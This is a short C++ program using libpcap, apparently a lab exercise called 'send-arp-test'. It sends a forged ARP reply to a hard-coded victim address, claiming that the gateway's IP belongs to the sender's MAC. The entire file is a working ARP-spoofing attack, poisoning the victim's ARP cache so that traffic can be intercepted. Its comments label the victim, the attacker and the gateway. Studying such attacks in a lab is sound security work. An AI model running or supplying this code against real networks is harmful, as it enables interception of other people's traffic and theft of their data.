#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

int main(int argc, char* argv[]) {
	if (argc != 2) {
		usage();
		return EXIT_FAILURE;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(dev, 0, 0, 0, errbuf);
	if (pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return EXIT_FAILURE;
	}

	EthArpPacket packet;

    //request
    //packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.dmac_ = Mac("90:de:80:9d:62:cb");//victim
    packet.eth_.smac_ = Mac("00:0f:00:40:20:7f");//me
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::Size;
	packet.arp_.pln_ = Ip::Size;

    //packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = Mac("00:0f:00:40:20:7f");//me
    packet.arp_.sip_ = htonl(Ip("192.168.38.233"));//gateway gateway-(change)>me
    packet.arp_.tmac_ = Mac("90:de:80:9d:62:cb");//victim
    packet.arp_.tip_ = htonl(Ip("192.168.38.184"));//victim

	int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
	}

	pcap_close(pcap);
}
